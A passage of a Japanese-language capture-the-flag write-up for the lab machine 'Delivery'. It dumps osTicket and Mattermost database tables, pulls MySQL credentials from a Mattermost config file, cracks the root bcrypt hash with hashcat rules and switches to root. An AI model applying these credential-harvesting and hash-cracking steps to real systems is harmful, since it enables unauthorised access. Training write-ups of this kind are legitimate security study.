|  2 |      0 |                2 |      0 | bob                              | 2021-01-05 03:26:08 | 2021-01-05 03:26:08 |
|  3 |      0 |                3 |      0 | 9ecfb4be145d47fda0724f697f35ffaf | 2021-01-05 06:06:28 | 2021-01-05 06:06:28 |
|  4 |      0 |                4 |      0 | c3ecacacc7b94f909d04dbfd308a9b93 | 2021-01-05 06:06:39 | 2021-01-05 06:06:39 |
|  5 |      0 |                5 |      0 | ff0a21fc6fc2488195e16ea854c963ee | 2021-01-05 06:06:45 | 2021-01-05 06:06:45 |
|  6 |      0 |                6 |      0 | 5b785171bfb34762a933e127630c4860 | 2021-01-05 06:06:46 | 2021-01-05 06:06:46 |
|  7 |      0 |                7 |      0 | hello                            | 2025-06-20 00:39:38 | 2025-06-20 00:39:38 |
+----+--------+------------------+--------+----------------------------------+---------------------+---------------------+
7 rows in set (0.001 sec)
```

ost_user__cdata・ost_user_account・ost_user_emailにも有用な情報ない
```sh
MariaDB [osticket]> select * from ost_user__cdata;
+---------+-------+------+---------------+-------+
| user_id | email | name | phone         | notes |
+---------+-------+------+---------------+-------+
|       1 | NULL  | NULL | NULL          | NULL  |
|       2 | NULL  | NULL |               |       |
|       3 | NULL  | NULL |               |       |
|       4 | NULL  | NULL |               |       |
|       5 | NULL  | NULL |               |       |
|       6 | NULL  | NULL |               |       |
|       7 | NULL  | NULL | 0000000000X81 |       |
+---------+-------+------+---------------+-------+
7 rows in set (0.001 sec)

MariaDB [osticket]> select * from ost_user_account;
Empty set (0.001 sec)

MariaDB [osticket]> select * from ost_user_email;
+----+---------+-------+-------------------------------------------+
| id | user_id | flags | address                                   |
+----+---------+-------+-------------------------------------------+
|  1 |       1 |     0 | support@osticket.com                      |
|  2 |       2 |     0 | lol@test.com                              |
|  3 |       3 |     0 | 9ecfb4be145d47fda0724f697f35ffaf@mail.htb |
|  4 |       4 |     0 | c3ecacacc7b94f909d04dbfd308a9b93@mail.htb |
|  5 |       5 |     0 | ff0a21fc6fc2488195e16ea854c963ee@mail.htb |
|  6 |       6 |     0 | 5b785171bfb34762a933e127630c4860@mail.htb |
|  7 |       7 |     0 | hello@hello.htb                           |
+----+---------+-------+-------------------------------------------+
7 rows in set (0.000 sec)
```


ost_staffの中も見てみたけど、もうすでに取得してるmaildelivererしか出てこない
```sh

MariaDB [osticket]> select * from ost_staff;
+----------+---------+---------+---------------+-----------+----------+--------------------------------------------------------------+---------+----------------------------+-------+-----------+--------+-----------+------+----------+--------+-------+----------+---------+-----------+------------+---------------+-----------------------+---------------+---------------+-------------------+------------------------+--------------------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+---------------------+---------------------+
| staff_id | dept_id | role_id | username      | firstname | lastname | passwd                                                       | backend | email                      | phone | phone_ext | mobile | signature | lang | timezone | locale | notes | isactive | isadmin | isvisible | onvacation | assigned_only | show_assigned_tickets | change_passwd | max_page_size | auto_refresh_rate | default_signature_type | default_paper_size | extra                    | permissions                                                                                                                                                                                                | created             | lastlogin           | passwdreset         | updated             |
+----------+---------+---------+---------------+-----------+----------+--------------------------------------------------------------+---------+----------------------------+-------+-----------+--------+-----------+------+----------+--------+-------+----------+---------+-----------+------------+---------------+-----------------------+---------------+---------------+-------------------+------------------------+--------------------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+---------------------+---------------------+
|        1 |       1 |       1 | maildeliverer | Delivery  | Person   | $2a$08$VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy | NULL    | maildeliverer@delivery.htb |       | NULL      |        |           | NULL | NULL     | NULL   | NULL  |        1 |       1 |         1 |          0 |             0 |                     0 |             0 |            25 |                 0 | none                   | Letter             | {"browser_lang":"en_US"} | {"user.create":1,"user.delete":1,"user.edit":1,"user.manage":1,"user.dir":1,"org.create":1,"org.delete":1,"org.edit":1,"faq.manage":1,"visibility.agents":1,"emails.banlist":1,"visibility.departments":1} | 2020-12-26 09:14:00 | 2020-12-26 11:24:22 | 2020-12-26 09:14:00 | 2020-12-26 11:24:22 |
+----------+---------+---------+---------------+-----------+----------+--------------------------------------------------------------+---------+----------------------------+-------+-----------+--------+-----------+------+----------+--------+-------+----------+---------+-----------+------------+---------------+-----------------------+---------------+---------------+-------------------+------------------------+--------------------+--------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+---------------------+---------------------+
1 row in set (0.001 sec)
```



mattermostの設定ファイル
- なんかcatで表示しようとすると固まってダメ
- mysqlに入るための認証情報が入ってる
```sh
less /opt/mattermost/config/config.json
<SNIP>
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
<SNIP>
```

mattermostテーブル一覧
```sh
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)

```

Usersが気になるので、一覧表示
```sh
MariaDB [mattermost]> select * from Users;
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+
| Id                         | CreateAt      | UpdateAt      | DeleteAt | Username                         | Password                                                     | AuthData | AuthService | Email                   | EmailVerified | Nickname | FirstName          | LastName | Position | Roles                    | AllowMarketing | Props | NotifyProps                                                                                                                                                                  | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone                                                                                 | MfaActive | MfaSecret |
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+
| 64nq8nue7pyhpgwm99a949mwya | 1608992663714 | 1608992663731 |        0 | surveybot                        |                                                              | NULL     |             | surveybot@localhost     |             0 |          | Surveybot          |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1608992663714 |     1608992663731 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
| 6akd5cxuhfgrbny81nj55au4za | 1609844799823 | 1609844799823 |        0 | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | NULL     |             | 4120849@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844799823 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
| 6wkx1ggn63r7f8q1hpzp7t4iiy | 1609844806814 | 1609844806814 |        0 | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | NULL     |             | 7466068@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844806814 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 |        0 | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             | root@delivery.htb       |             1 |          |                    |          |          | system_admin system_user |              1 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609157893370 |                 0 |              0 | en     | {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"} |         0 |           |
| hatotzdacb8mbe95hm4ei8i7ny | 1609844805777 | 1609844805777 |        0 | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | NULL     |             | 9122359@delivery.htb    |             0 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844805777 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
| jing8rk6mjdbudcidw6wz94rdy | 1608992663664 | 1608992663664 |        0 | channelexport                    |                                                              | NULL     |             | channelexport@localhost |             0 |          | Channel Export Bot |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1608992663664 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
| n9magehhzincig4mm97xyft9sc | 1609844789048 | 1609844800818 |        0 | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | NULL     |             | 5056505@delivery.htb    |             1 |          |                    |          |          | system_user              |              0 | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} |      1609844789048 |                 0 |              0 | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               |         0 |           |
+----------------------------+---------------+---------------+----------+----------------------------------+--------------------------------------------------------------+----------+-------------+-------------------------+---------------+----------+--------------------+----------+----------+--------------------------+----------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+-------------------+----------------+--------+------------------------------------------------------------------------------------------+-----------+-----------+

```

見にくいので、markdownで整理

| Id                         | CreateAt      | UpdateAt      | DeleteAt | Username                         | Password                                                     | AuthData | AuthService | Email                   | EmailVerified | Nickname | FirstName          | LastName | Position | Roles                    | AllowMarketing | Props | NotifyProps                                                                                                                                                                  | LastPasswordUpdate | LastPictureUpdate | FailedAttempts | Locale | Timezone                                                                                 | MfaActive | MfaSecret |
|----------------------------|---------------|---------------|----------|----------------------------------|--------------------------------------------------------------|----------|-------------|-------------------------|---------------|----------|--------------------|----------|----------|--------------------------|----------------|-------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|-------------------|----------------|--------|------------------------------------------------------------------------------------------|-----------|-----------|
| 64nq8nue7pyhpgwm99a949mwya | 1608992663714 | 1608992663731 | 0        | surveybot                        |                                                              | NULL     |             | surveybot@localhost     | 0             |          | Surveybot          |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1608992663714      | 1608992663731     | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |
| 6akd5cxuhfgrbny81nj55au4za | 1609844799823 | 1609844799823 | 0        | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | NULL     |             | 4120849@delivery.htb    | 0             |          |                    |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1609844799823      | 0                 | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |
| 6wkx1ggn63r7f8q1hpzp7t4iiy | 1609844806814 | 1609844806814 | 0        | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | NULL     |             | 7466068@delivery.htb    | 0             |          |                    |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1609844806814      | 0                 | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |
| dijg7mcf4tf3xrgxi5ntqdefma | 1608992692294 | 1609157893370 | 0        | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | NULL     |             | root@delivery.htb       | 1             |          |                    |          |          | system_admin system_user | 1              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1609157893370      | 0                 | 0              | en     | {"automaticTimezone":"Africa/Abidjan","manualTimezone":"","useAutomaticTimezone":"true"} | 0         |           |
| hatotzdacb8mbe95hm4ei8i7ny | 1609844805777 | 1609844805777 | 0        | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | NULL     |             | 9122359@delivery.htb    | 0             |          |                    |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1609844805777      | 0                 | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |
| jing8rk6mjdbudcidw6wz94rdy | 1608992663664 | 1608992663664 | 0        | channelexport                    |                                                              | NULL     |             | channelexport@localhost | 0             |          | Channel Export Bot |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1608992663664      | 0                 | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |
| n9magehhzincig4mm97xyft9sc | 1609844789048 | 1609844800818 | 0        | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | NULL     |             | 5056505@delivery.htb    | 1             |          |                    |          |          | system_user              | 0              | {}    | {"channel":"true","comments":"never","desktop":"mention","desktop_sound":"true","email":"true","first_name":"false","mention_keys":"","push":"mention","push_status":"away"} | 1609844789048      | 0                 | 0              | en     | {"automaticTimezone":"","manualTimezone":"","useAutomaticTimezone":"true"}               | 0         |           |


rootのパスワードハッシュを発見
root : $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO

クラックを試みる

```sh
echo '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO' > hash.txt
```

hashcatで、上で、mattermostがrootで言ってた、「PleaseSubscribe!」を使う
```sh
└─$ hashcat hash.txt pls.txt -r /usr/share/hashcat/rules/best64.rule -m 3200
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: pls.txt
* Passwords.: 1
* Bytes.....: 17
* Keyspace..: 77
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Fri Jun 20 00:18:31 2025 (1 sec)
Time.Estimated...: Fri Jun 20 00:18:32 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (pls.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       15 H/s (0.82ms) @ Accel:6 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 21/77 (27.27%)
Rejected.........: 0/21 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21

Started: Fri Jun 20 00:18:28 2025
Stopped: Fri Jun 20 00:18:34 2025

```

クラックできた
### rootの認証情報
root : PleaseSubscribe!21

rootに切り替えて、フラグ取得
```sh
maildeliverer@Delivery:/opt/mattermost/logs$ su -
Password: 
root@Delivery:~# ls
mail.sh  note.txt  py-smtp.py  root.txt
root@Delivery:~# cat root.txt

```
